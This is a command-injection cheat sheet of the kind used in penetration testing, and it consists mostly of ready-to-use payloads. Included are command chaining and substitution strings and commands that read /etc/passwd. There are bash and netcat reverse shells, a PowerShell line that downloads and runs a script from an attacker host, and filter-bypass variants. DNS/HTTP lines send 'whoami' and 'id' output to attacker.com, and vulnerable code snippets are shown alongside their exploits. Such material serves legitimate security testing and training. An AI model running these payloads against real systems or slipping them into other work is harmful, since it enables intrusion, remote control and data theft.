---
tags:
  - critical
  - server-side
---

# Command Injection

## TL;DR

Execute OS commands through application inputs.

```bash
; id
| whoami
`id`
$(whoami)
```

## Detection

### Basic Payloads

```bash
# Chaining
; id
& id
&& id
| id
|| id

# Command substitution
`id`
$(id)

# Newline
%0a id
%0d%0a id
```

### Time-Based

```bash
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1 &
```

### DNS-Based (OOB)

```bash
; nslookup attacker.com
; curl http://attacker.com/
$(nslookup attacker.com)
`dig attacker.com`
```

## Exploitation

### Unix/Linux

```bash
# Read files
; cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`

# Reverse shell
; bash -i >& /dev/tcp/attacker/4444 0>&1
; nc attacker 4444 -e /bin/bash
```

### Windows

```cmd
& whoami
&& whoami
| whoami
& powershell -nop -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"
```

## Filter Bypasses

### Space Bypass

```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat%09/etc/passwd
{cat,/etc/passwd}
```

### Slash Bypass

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo /)etc$(echo /)passwd
```

### Keyword Bypass

```bash
# Concatenation
who'a'mi
who"a"mi
w\h\o\a\m\i

# Variable expansion
w$()hoami
who$@ami

# Wildcards
/???/??t /???/p??s??
cat /et*/pas*
```

### Newline Injection

```bash
%0a id
%0d%0a id
data%0acommand
```

### Command Separators

```bash
;       # Semicolon
%0a     # Newline
&       # Background
|       # Pipe
&&      # AND
||      # OR
%26     # URL-encoded &
%7c     # URL-encoded |
```

## Context-Specific

### Node.js child_process

```javascript
// exec() - vulnerable (uses shell)
exec(`command ${userInput}`);
// Exploit: userInput = "; id"

// execFile() - argument injection
execFile('command', ['--arg=' + userInput]);
```

### PHP system/exec

```php
system("ping " . $_GET['ip']);
// Exploit: ?ip=127.0.0.1; id
```

### Python os.system

```python
os.system("ping " + user_input)
# Exploit: user_input = "127.0.0.1; id"
```

### Ruby open()

```ruby
# Pipe prefix executes command
localfile = "| id > /tmp/pwned"
open(localfile, "w")
```

## Argument Injection

When special chars are escaped but input becomes argument:

```bash
--help
-o /tmp/output
--config http://attacker.com/config

# Examples
curl: -o /tmp/x (write file)
tar: --use-compress-program=id
git: --upload-pack=touch${IFS}pwned
```

**Prevention:** Use `--` to end options

```bash
command -- "$user_input"
```

## DNS/HTTP Exfiltration

```bash
# DNS
; nslookup `whoami`.attacker.com
$(ping -c1 `id | base64`.attacker.com)

# HTTP
; curl http://attacker.com/?data=`id | base64`
; wget http://attacker.com/$(whoami)
```

## Common Parameters

```
?cmd=, ?exec=, ?command=, ?execute=
?ping=, ?query=, ?code=, ?func=
?load=, ?process=, ?run=, ?payload=
```

## Tools

```bash
# Commix
python commix.py -u "http://target/?cmd=test"
```

## Real Examples

- **HackerOne #690010:** Node.js exec() injection
- **HackerOne #1776476:** Apache Airflow Bash RCE
- **HackerOne #183458:** UniFi firmware download command injection
